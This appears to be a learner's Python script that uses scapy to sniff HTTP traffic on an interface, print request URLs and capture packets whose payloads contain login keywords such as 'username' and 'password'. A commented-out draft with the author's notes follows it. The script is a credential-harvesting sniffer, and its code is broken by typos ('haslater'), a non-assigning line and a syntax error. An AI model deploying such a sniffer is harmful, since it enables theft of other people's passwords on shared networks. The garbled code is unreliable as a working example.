#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
        if packet.haslater(scapy.Raw):      # maybe change layer from web to web(Raw to another name)
         print(packet[scapy.Raw].load)
         load.packet[scapy.Raw].load
         keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if the keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)
        
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >" + login_info + "\n\n")    


sniff("eth0")




##########################################################
#def sniff(interface):
#    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
#
#def process_sniffed_packet(packet):
#    if packet.haslayer(http.HTTPRequest):
#        print(packet.show()) # here -> need to fine the login page and fine the name and password 
#                               form the show and after that, find the name class that use it
#                               and use more if like this "if packet.haslater(scapy.name class u found):"
#
#sniff("eth0")
#
###########################################################
